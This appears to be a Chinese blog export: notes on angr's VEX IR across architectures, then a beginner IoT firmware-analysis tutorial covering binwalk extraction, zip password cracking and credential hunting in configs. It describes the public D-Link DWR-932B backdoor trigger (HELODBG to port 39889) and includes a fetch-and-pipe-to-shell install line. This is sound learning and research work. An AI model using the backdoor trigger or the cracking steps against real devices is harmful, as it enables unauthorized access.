<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Standard integer comparisons */</span><br><span class="line">Iop_CmpLT32S, Iop_CmpLT64S,</span><br><span class="line">Iop_CmpLE32S, Iop_CmpLE64S,</span><br><span class="line">Iop_CmpLT32U, Iop_CmpLT64U,</span><br><span class="line">Iop_CmpLE32U, Iop_CmpLE64U,</span><br></pre></td></tr></table></figure>
<p>该结果为在x86汇编中为指令jge服务（大于等于则跳转）<br>
所以小于3时t8=t20=t16=1<br>
因此cmpLT应该是“前小于后返回1”<br>
所以&quot;CmpL*&quot;是只能比较小于或等于？</p>
<p><em>注：试了一下还真是这样的，形成的中间代码会把其他判断方式转换成&quot;&lt;“/”=&quot;</em><br>
<em>注2：在微软的文档搜到了SSE2指令集，里边的比较指令和 vex ir 长得还蛮像的↓</em><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210516225639.png" alt="20210516225639"></p>
<h2 id="来个aarch64的">来个aarch64的</h2>
<p>用aarch64-linux-gnu-gcc编译了相同的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> a;</span><br><span class="line">	<span class="keyword">int</span>* b;</span><br><span class="line">&#125;aa;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">double</span> b=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">switch</span>(a)&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=2&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a=1&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;a==null&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;aa.a);</span><br><span class="line">	aa.b = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (aa.a ==a)</span><br><span class="line">		aa.b[<span class="number">1</span>] = aa.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用angr加载的时候会产生警告，但（对于这个样例）没有影响<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510184101.png" alt="20210510184101"><br>
<em>注：上一个应该是因为找不到动态链接库，编译选项设置静态编译后可以正常加载</em></p>
<p>发现vex ir用到的寄存器是根据程序cpu架构改变的。如i386、amd64下用到PUT(rip)、PUT(eip)，在aarch64下则是PUT(pc)</p>
<p>选取下面这句代码的中间代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(qword_4999C8 + <span class="number">4</span>) = aa;</span><br></pre></td></tr></table></figure>
<h3 id="aarch64">aarch64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213959.png" alt="20210510213959"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x400778, 4, 0) ------</span><br><span class="line">   01 | ------ IMark(0x40077c, 4, 0) ------</span><br><span class="line">   02 | PUT(pc) = 0x0000000000400780</span><br><span class="line">   03 | ------ IMark(0x400780, 4, 0) ------</span><br><span class="line">   04 | t4 = LDle:I64(0x00000000004999c8)</span><br><span class="line">   05 | ------ IMark(0x400784, 4, 0) ------</span><br><span class="line">   06 | t7 = Add64(t4,0x0000000000000004)</span><br><span class="line">   07 | ------ IMark(0x400788, 4, 0) ------</span><br><span class="line">   08 | ------ IMark(0x40078c, 4, 0) ------</span><br><span class="line">   09 | PUT(pc) = 0x0000000000400790</span><br><span class="line">   10 | ------ IMark(0x400790, 4, 0) ------</span><br><span class="line">   11 | t34 = LDle:I32(0x00000000004999c0)</span><br><span class="line">   12 | t57 = 32Uto64(t34)</span><br><span class="line">   13 | t33 = t57</span><br><span class="line">   14 | PUT(pc) = 0x0000000000400794</span><br><span class="line">   15 | ------ IMark(0x400794, 4, 0) ------</span><br><span class="line">   16 | t58 = 64to32(t33)</span><br><span class="line">   17 | t37 = t58</span><br><span class="line">   18 | STle(t7) = t37</span><br><span class="line">   19 | ------ IMark(0x400798, 4, 0) ------</span><br><span class="line">   20 | ------ IMark(0x40079c, 4, 0) ------</span><br><span class="line">   21 | PUT(x1) = 0x0000000000000000</span><br><span class="line">   22 | ------ IMark(0x4007a0, 4, 0) ------</span><br><span class="line">   23 | PUT(pc) = 0x00000000004007a4</span><br><span class="line">   24 | ------ IMark(0x4007a4, 4, 0) ------</span><br><span class="line">   25 | t19 = LDle:I64(0x0000000000497f50)</span><br><span class="line">   26 | PUT(x0) = t19</span><br><span class="line">   27 | PUT(pc) = 0x00000000004007a8</span><br><span class="line">   28 | ------ IMark(0x4007a8, 4, 0) ------</span><br><span class="line">   29 | t46 = GET:I64(xsp)</span><br><span class="line">   30 | t45 = Add64(t46,0x0000000000000028)</span><br><span class="line">   31 | t21 = LDle:I64(t45)</span><br><span class="line">   32 | PUT(pc) = 0x00000000004007ac</span><br><span class="line">   33 | ------ IMark(0x4007ac, 4, 0) ------</span><br><span class="line">   34 | t23 = LDle:I64(t19)</span><br><span class="line">   35 | ------ IMark(0x4007b0, 4, 0) ------</span><br><span class="line">   36 | t27 = Sub64(t21,t23)</span><br><span class="line">   37 | PUT(x2) = t27</span><br><span class="line">   38 | PUT(cc_op) = 0x0000000000000004</span><br><span class="line">   39 | PUT(cc_dep1) = t21</span><br><span class="line">   40 | PUT(cc_dep2) = t23</span><br><span class="line">   41 | PUT(cc_ndep) = 0x0000000000000000</span><br><span class="line">   42 | ------ IMark(0x4007b4, 4, 0) ------</span><br><span class="line">   43 | PUT(x3) = 0x0000000000000000</span><br><span class="line">   44 | PUT(pc) = 0x00000000004007b8</span><br><span class="line">   45 | ------ IMark(0x4007b8, 4, 0) ------</span><br><span class="line">   46 | t60 = CmpEQ64(t21,t23)</span><br><span class="line">   47 | t59 = 1Uto64(t60)</span><br><span class="line">   48 | t55 = t59</span><br><span class="line">   49 | t61 = 64to1(t55)</span><br><span class="line">   50 | t49 = t61</span><br><span class="line">   51 | if (t49) &#123; PUT(pc) = 0x4007c0; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(pc) = 0x00000000004007bc; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="amd64">amd64</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210510213751.png" alt="20210510213751"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   00 | ------ IMark(0x40126d, 7, 0) ------</span><br><span class="line">   01 | t9 = LDle:I64(0x0000000000404028)</span><br><span class="line">   02 | ------ IMark(0x401274, 4, 0) ------</span><br><span class="line">   03 | t10 = Add64(t9,0x0000000000000004)</span><br><span class="line">   04 | PUT(rdx) = t10</span><br><span class="line">   05 | PUT(rip) = 0x0000000000401278</span><br><span class="line">   06 | ------ IMark(0x401278, 6, 0) ------</span><br><span class="line">   07 | t13 = LDle:I32(0x0000000000404020)</span><br><span class="line">   08 | t29 = 32Uto64(t13)</span><br><span class="line">   09 | t12 = t29</span><br><span class="line">   10 | PUT(rip) = 0x000000000040127e</span><br><span class="line">   11 | ------ IMark(0x40127e, 2, 0) ------</span><br><span class="line">   12 | t30 = 64to32(t12)</span><br><span class="line">   13 | t14 = t30</span><br><span class="line">   14 | STle(t10) = t14</span><br><span class="line">   15 | ------ IMark(0x401280, 5, 0) ------</span><br><span class="line">   16 | PUT(rax) = 0x0000000000000000</span><br><span class="line">   17 | PUT(rip) = 0x0000000000401285</span><br><span class="line">   18 | ------ IMark(0x401285, 4, 0) ------</span><br><span class="line">   19 | t18 = GET:I64(rbp)</span><br><span class="line">   20 | t17 = Add64(t18,0xfffffffffffffff8)</span><br><span class="line">   21 | t19 = LDle:I64(t17)</span><br><span class="line">   22 | PUT(rip) = 0x0000000000401289</span><br><span class="line">   23 | ------ IMark(0x401289, 9, 0) ------</span><br><span class="line">   24 | t21 = GET:I64(fs)</span><br><span class="line">   25 | t20 = Add64(0x0000000000000028,t21)</span><br><span class="line">   26 | t6 = LDle:I64(t20)</span><br><span class="line">   27 | t5 = Xor64(t19,t6)</span><br><span class="line">   28 | PUT(cc_op) = 0x0000000000000014</span><br><span class="line">   29 | PUT(cc_dep1) = t5</span><br><span class="line">   30 | PUT(cc_dep2) = 0x0000000000000000</span><br><span class="line">   31 | PUT(rcx) = t5</span><br><span class="line">   32 | PUT(rip) = 0x0000000000401292</span><br><span class="line">   33 | ------ IMark(0x401292, 2, 0) ------</span><br><span class="line">   34 | t32 = CmpEQ64(t5,0x0000000000000000)</span><br><span class="line">   35 | t31 = 1Uto64(t32)</span><br><span class="line">   36 | t27 = t31</span><br><span class="line">   37 | t33 = 64to1(t27)</span><br><span class="line">   38 | t22 = t33</span><br><span class="line">   39 | if (t22) &#123; PUT(rip) = 0x401299; Ijk_Boring &#125;</span><br><span class="line">   NEXT: PUT(rip) = 0x0000000000401294; Ijk_Boring</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>课题</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT固件分析入门</title>
    <url>/3607.html</url>
    <content><![CDATA[<blockquote>
<p>本文由<strong>本人</strong>首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ1OTQ1">IoT固件分析入门 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>不知道干啥，打算把前段时间GitHub 上 star 了的一个项目学一遍，地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0c0cmIzbi9Jb1RfU2VjX1R1dG9yaWFsLw==">IoT_Sec_Tutorial<i class="fa fa-external-link-alt"></i></span></p>
<p>访问慢的话，gitee上也有镜像可看<br>
目测纯固件，贼基础<br>
update：像是对《路由器0day》那本书部分内容的整理和补充</p>
<span id="more"></span>
<h1>0x0准备</h1>
<p>因为kali是刚上大学的时候装的，现在都出到2021了，我的版本还是2019，所以先升级一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.list</span><br><span class="line">sudo apt update &amp;&amp; sudo apt -y full-upgrade</span><br><span class="line">[ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f</span><br></pre></td></tr></table></figure>
<ul>
<li>更新完后可以查看一下系统版本：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep VERSION /etc/os-release</span><br></pre></td></tr></table></figure>
<ul>
<li>更新系统时间（我的时间好像之前一直都不对orz）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install -y ntpdate</span><br><span class="line">rm -rf etc/localtime</span><br><span class="line">cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">ntpdate -u ntp.api.bz</span><br></pre></td></tr></table></figure>
<ul>
<li>切换shell（为啥升级后zsh没有直接变成默认orzz）<br>
先查看系统中有几种shell：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>
<p>kali自带了zsh，直接切换就行了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -i /etc/skel/.zshrc ~/</span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<p>zsh配合oh-my-zsh比较好用，安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure>
<p>添加全路径显示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gedit ~/.oh-my-zsh/themes/robbyrussell.zsh-theme</span><br><span class="line"><span class="meta">#</span><span class="bash">然后把%&#123;<span class="variable">$fg</span>[cyan]%&#125;%c%&#123;<span class="variable">$reset_color</span>%&#125;的%c改为[<span class="variable">$PWD</span>]</span></span><br></pre></td></tr></table></figure>
<p>如果想用别的桌面系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config x-session-manager</span><br></pre></td></tr></table></figure>
<h1>0x1提取固件</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前用过binwalk，但大多都是在misc题目里处理压缩文件、图片啥的，没有仔细看过binwalk的命令</span><br><span class="line">其实除了binwalk之外，还有其他的固件分析/提取工具，在GitHub上用“firmware analysis”之类的关键词能查到</span><br></pre></td></tr></table></figure>
<p>给了个华硕RT-N300路由器的固件，binwalk直接提取即可。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224600.png" alt="20210620224600"><br>
提取出来发现没有进行加密（…16年，这也太不安全了吧orz，不过现在基本都有了</p>
<p>可以看到这个路由器用的是squashfs文件系统</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620225019.png" alt="20210620225019">其中squashfs-root可用于分析了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。</span><br><span class="line"></span><br><span class="line">Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。</span><br><span class="line"></span><br><span class="line">Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。</span><br><span class="line"></span><br><span class="line">由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如：</span><br><span class="line">1、安装Linux时用的live cd</span><br><span class="line">2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。</span><br></pre></td></tr></table></figure>
<h2 id="Binwalk命令选项">Binwalk命令选项</h2>
<p>常规选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224159.png" alt="20210620224159"></p>
<p>提取选项：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224110.png" alt="20210620224110"></p>
<p>Diff：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210620224324.png" alt="20210620224324"></p>
<p>文件签名：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986195558.png" alt="1624986195558"></p>
<p>熵值：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986159726.png" alt="1624986159726"></p>
<p>Raw Compression：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624986173336.png" alt="1624986173336"></p>
<h2 id="如何手动提取固件">如何手动提取固件</h2>
<p>squashfs文件系统头部特征较多，有sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。我们用hexdump搜索特征在文件中的地址</p>
<ul>
<li>hexdump：一个二进制文件的查看工具，可转为OCT、DEC、HEX进制查看<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621132510.png" alt="20210621132510"></li>
</ul>
<p>得到如下搜索结果<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621133748.png" alt="20210621133748"></p>
<p>hsqs位于文件的0xe20c0，用dd命令截取出固件：</p>
<ul>
<li>注：dd命令中skip指定的值只能为十进制。用shell转换进制可以使用：$((BASE#NUM))</li>
<li><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255953284.png" alt="1624255953284"></li>
</ul>
<p>得到了一个squashfs格式的文件<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210621134851.png" alt="20210621134851"><br>
用unsquashfs解压得到squashfs-root，即用binwalk提取出的同名文件。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624255856853.png" alt="1624255856853"></p>
<p>如果遇到binwalk之类的工具无法提取的情况，大多都是经过混淆，需要进一步处理</p>
<h2 id="Binwalk如何进行提取：">Binwalk如何进行提取：</h2>
<p>通过maigc特征集与文件进行比对，但识别效率比file命令高多了<br>
特征集：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1JlRmlybUxhYnMvYmlud2Fsay90cmVlLzYyZTljYWExNjQvc3JjL2JpbndhbGsvbWFnaWM=">https://github.com/ReFirmLabs/binwalk/tree/62e9caa164/src/binwalk/magic<i class="fa fa-external-link-alt"></i></span></p>
<p>识别过程主要使用libmagic库的4个函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">magic_t</span> <span class="title">magic_open</span><span class="params">(<span class="keyword">int</span> flags)</span></span>;<span class="comment">//创建并返回一个magic cookie指针。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic_close</span><span class="params">(<span class="keyword">magic_t</span> cookie)</span></span>;<span class="comment">//关闭magic签名数据库并释放所有使用过的资源。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">magic_buffer</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">void</span> *buffer,<span class="keyword">size_t</span> len)</span></span>;<span class="comment">//读取buffer中指定长度的数据并与magic签名数据库进行对比，返回对比结果描述。</span></span><br><span class="line"></span><br><span class="line"><span class="function">Int <span class="title">magic_load</span><span class="params">(<span class="keyword">magic_t</span> cookie,<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>;<span class="comment">//从filename指定文件加载magic签名数据库，Binwalk把多个magic签名文件组合到一个临时文件中用于加载</span></span><br></pre></td></tr></table></figure>
<h1>0x2 静态分析</h1>
<p>给了个从Dlink固件里提取的样本，打开发现被加密了，得爆破。</p>
<p>kali自带了一些关于压缩文件的工具，比如生成字典用的crunch、rsmangler，爆破用的frackzip等，这些工具用法都不难</p>
<ul>
<li>crunch:<span class="exturl" data-url="aHR0cHM6Ly9ieXN0YXJ0LmNuL2luZGV4LnBocC8xNy9saW51eC8wNw==">Kali使用crunch生成密码字典 - 青檬小栈 <i class="fa fa-external-link-alt"></i></span><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624260673155.png" alt="1624260673155"></li>
</ul>
<p>直接用frackzip破解，（根据教程的提示）得到密码beUT9Z</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624261882922.png" alt="1624261882922"></p>
<p>解压得到以下文件</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624262791018.png" alt="1624262791018"></p>
<ul>
<li>.mbn：高通的一套用于加载网络环境的文件（modem software configuration）</li>
<li>.yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取</li>
</ul>
<p>unyaffs提取yaffs2</p>
<p>核心应该是2K-mdm-image-mdm9625.yaffs2，不确定的话可以把三个.yaffs2都提取了（然后就该复习一下嵌入式系统的目录结构了）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264395101.png" alt="1624264395101"></p>
<p>接下来查看配置文件，有可能从配置文件中发现敏感信息</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624264784960.png" alt="1624264784960"></p>
<blockquote>
<p>其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名</p>
</blockquote>
<p>cat 一看，果然no-ip的用户名和密码都出现了（这么明显真的难以置信）</p>
<p>接下来使用firmwalker来自动化遍历</p>
<blockquote>
<p>Firmwalker:</p>
<p>A simple bash script for searching the extracted or mounted firmware file system.</p>
<p>It will search through the extracted or mounted firmware file system for things of interest such as:</p>
<ul>
<li>etc/shadow and etc/passwd</li>
<li>list out the etc/ssl directory</li>
<li>search for SSL related files such as .pem, .crt, etc.</li>
<li>search for configuration files</li>
<li>look for script files</li>
<li>search for other .bin files</li>
<li>look for keywords such as admin, password, remote, etc.</li>
<li>search for common web servers used on IoT devices</li>
<li>search for common binaries such as ssh, tftp, dropbear, etc.</li>
<li>search for URLs, email addresses and IP addresses</li>
<li>Experimental support for making calls to the Shodan API using the Shodan CLI</li>
</ul>
<p>（其实就相当于一个遍历查找后缀、内容的批处理脚本）</p>
</blockquote>
<p>使用脚本获得所有可能可以利用的文件（建议进入脚本目录执行）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624270973127.png" alt="1624270973127"></p>
<p>除了配置文件外，分析存在风险的二进制程序也很重要。</p>
<p>在etc/init.d目录下存放启动时运行的程序和脚本，其中有一个叫start_appmgr，mgr一般指固件的主控。查看脚本：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273313162.png" alt="1624273313162"></p>
<p>把appmgr拖到ida<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273441470.png" alt="1624273441470"></p>
<p>凭借一点点pwn的经验，我们发现了一个backdoor<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624273657173.png" alt="1624273657173"></p>
<p>这个漏洞被收录到CVE-2016-10178：<span class="exturl" data-url="aHR0cHM6Ly9waWVycmVraW0uZ2l0aHViLmlvL2Jsb2cvMjAxNi0wOS0yOC1kbGluay1kd3ItOTMyYi1sdGUtcm91dGVycy12dWxuZXJhYmlsaXRpZXMuaHRtbA==">Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE …) - IT Security Research by Pierre (pierrekim.github.io)<i class="fa fa-external-link-alt"></i></span></p>
<p>即向192.168.1.1:39889发送HELODBG可以直接getshell（不太清楚为啥是39889端口，静态看了好久没看出来，<s>猜测是跟下图和label_66有关</s>）</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624281330648.png" alt="1624281330648"></p>
<p>update:用Ghidra搜到了<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624282660256.png" alt="1624282660256"></p>
<p>这个漏洞确实明显2333</p>
<p>这个固件还有好几个漏洞，太拉了吧Orz…</p>
<h1>0x3 动态分析</h1>
<h2 id="QEMU和Firmadyne">QEMU和Firmadyne</h2>
<p>QEMU这个模拟器想必都不陌生，一个近乎能够模拟所有硬件设备的软件；倒是第一次听说Firmadyne这个工具，查了一下是一个基于QEMU的分析平台，包含模拟、固件提取、调试等功能，但似乎支持的硬件设备较少？orz</p>
<h2 id="部署Firmadyne">部署Firmadyne</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tutorial里用的是attifyti提供的Ubuntu 14（因为作者说部署这玩意太麻烦了），但Firmadyne的作者在项目的某个issue里说了句“Ubuntu 14 也太早了”之类的话，于是打算自己部署一下</span><br><span class="line">Also，如果想用直接用attifyti的AttifyOS，https://github.com/adi0x90/attifyos，目前的系统基于Ubuntu18.04，官方的下载地址在谷歌网盘</span><br></pre></td></tr></table></figure>
<h3 id="准备">准备</h3>
<p>因为涉及到GitHub上一些项目的下载，网络不太好的话可能需要一些帮助：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clash on kali:</span><br><span class="line">下载clash并运行：https://github.com/Dreamacro/clash/releases</span><br><span class="line">导入节点：wget -O ~/.config/clash/config.yaml  clash_url</span><br><span class="line"></span><br><span class="line">配置代理：</span><br><span class="line">gsettings set org.gnome.system.proxy mode &#x27;manual&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.http port 7890</span><br><span class="line">gsettings set org.gnome.system.proxy.http host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy.socks port 7891</span><br><span class="line">gsettings set org.gnome.system.proxy.socks host &#x27;127.0.0.1&#x27;</span><br><span class="line">gsettings set org.gnome.system.proxy ignore-hosts &quot;[&#x27;localhost&#x27;, &#x27;127.0.0.0/8&#x27;, &#x27;::1&#x27;]&quot;\</span><br><span class="line"></span><br><span class="line">进行配置，访问：</span><br><span class="line">http://clash.razord.top/</span><br></pre></td></tr></table></figure>
<p>** 注：以下绕了好多弯，最后也没成功，用了AttifyOS 😅😅😅😅😅</p>
<h3 id="【方案1】安装Firmadyne">【方案1】安装Firmadyne</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br><span class="line">apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan</span><br><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">cd ./firmadyne</span><br><span class="line">./download.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置Postgresql：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装数据库</span><br><span class="line">sudo apt-get install postgresql</span><br><span class="line"># 创建用户,注意要设置密码为 firmadyne</span><br><span class="line">sudo -u postgres createuser -P firmadyne</span><br><span class="line"># 创建数据库</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line"># 初始化数据库</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure>
<p>如果出现如下错误</p>
<blockquote>
<p>could not connect to database template1: could not connect to server: No such file or directory.</p>
<p>Is the server running locally and accepting</p>
<p>connections on Unix domain socket “var/run/postgresql/.s.PGSQL.5432”?</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624444045680.png" alt="1624444045680"></p>
<p>有可能是没有初始化数据库（至少我是因为这个），用如下方法解决：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置postgres用户的密码</span></span><br><span class="line">passwd postgres</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建postgresql的文件夹</span></span><br><span class="line">sudo mkdir /data</span><br><span class="line">sudo chmod o+w /data</span><br><span class="line">su - postgres</span><br><span class="line">mkdir /data/postgresql</span><br><span class="line">mkdir /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> postgres用户初始化数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/initdb -D /data/postgresql/data</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动数据库</span></span><br><span class="line">/usr/lib/postgresql/13/bin/pg_ctl -D /data/postgresql/data -l logfile start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否监听了端口(结果应类似下图)</span></span><br><span class="line">netstat -nlp |grep 5432</span><br><span class="line"></span><br><span class="line">参考：https://www.cnblogs.com/0x200/p/14026460.html</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624443670290.png" alt="1624443670290"></p>
<p>接下来应该就能按照官方的Usage来使用了（没试）：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1hZHluZS9maXJtYWR5bmUjdXNhZ2U=">firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware <i class="fa fa-external-link-alt"></i></span></p>
<h3 id="【方案2】安装firmware-analysis-plus">【方案2】安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">firmware-analysis-plus<i class="fa fa-external-link-alt"></i></span></h3>
<p>因为用Firmadyne直接进行调试比较麻烦，所以用了FAP这个项目。</p>
<p>这是个国人写的中文项目，没啥好说的：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpeWFuc29uZzIwMTgvZmlybXdhcmUtYW5hbHlzaXMtcGx1cw==">liyansong2018/firmware-analysis-plus: 开源固件仿真平台，使用 firmadyne 一键模拟固件 (github.com)<i class="fa fa-external-link-alt"></i></span></p>
<p>安装作者提供的binwalk的时候一直报错(kali2021 &amp; ubuntu18 both)，导致一直卡在提取固件的步骤（emmmm哪位大哥部署成功后教我一下)</p>
<p><img src="https://user-images.githubusercontent.com/29673689/123412395-21b98c00-d5e4-11eb-9f18-48bfe66710b9.png" alt="image"></p>
